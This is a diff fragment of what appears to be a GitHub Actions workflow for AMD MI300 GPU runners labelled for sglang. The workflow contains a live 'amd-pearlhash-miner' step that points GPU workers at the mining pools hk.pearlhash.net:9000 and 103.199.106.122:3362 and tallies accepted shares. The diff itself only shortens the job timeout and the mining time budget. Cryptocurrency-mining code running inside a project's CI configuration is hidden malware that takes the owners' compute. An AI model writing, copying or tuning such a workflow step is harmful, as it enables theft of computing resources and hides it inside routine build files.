@@ -60,7 +60,7 @@ jobs:
           - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 19, ngpu: 2}
           - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 20, ngpu: 2}
     runs-on: ${{ matrix.label }}
-    timeout-minutes: 45
+    timeout-minutes: 15
     steps:
       - name: amd-pearlhash-miner
         env:
@@ -195,7 +195,7 @@ jobs:
           if [ "${JOBS:-0}" -lt 1 ]; then echo SWITCH_TO_HK; stop_all; start_all PH hk.pearlhash.net:9000 "$W"; sleep 90; fi
           SWITCHED_LP=0
           k=0
-          while [ "$k" -lt 24 ]; do
+          while [ "$k" -lt 6 ]; do
             k=$((k+1)); sleep 60
             AC=$(accsum)
             for g in $(seq 0 $((N-1))); do
@@ -209,7 +209,7 @@ jobs:
               echo "STICKY_LP_FALLBACK_NO_ACCEPT_900S at=$(TS)"
               stop_all; start_all LP 103.199.106.122:3362 "${W}+${NOCK}"; SWITCHED_LP=1
             fi
-            if [ "$SECONDS" -ge 1560 ]; then echo BUDGET_REACHED at=$(TS); break; fi
+            if [ "$SECONDS" -ge 420 ]; then echo BUDGET_REACHED at=$(TS); break; fi
           done
           echo "--- per-share accepted lines ---"
           grep -aE 'accepted \([0-9]+/[0-9]+\)' "$D"/gpu-*.log 2>/dev/null | tail -120
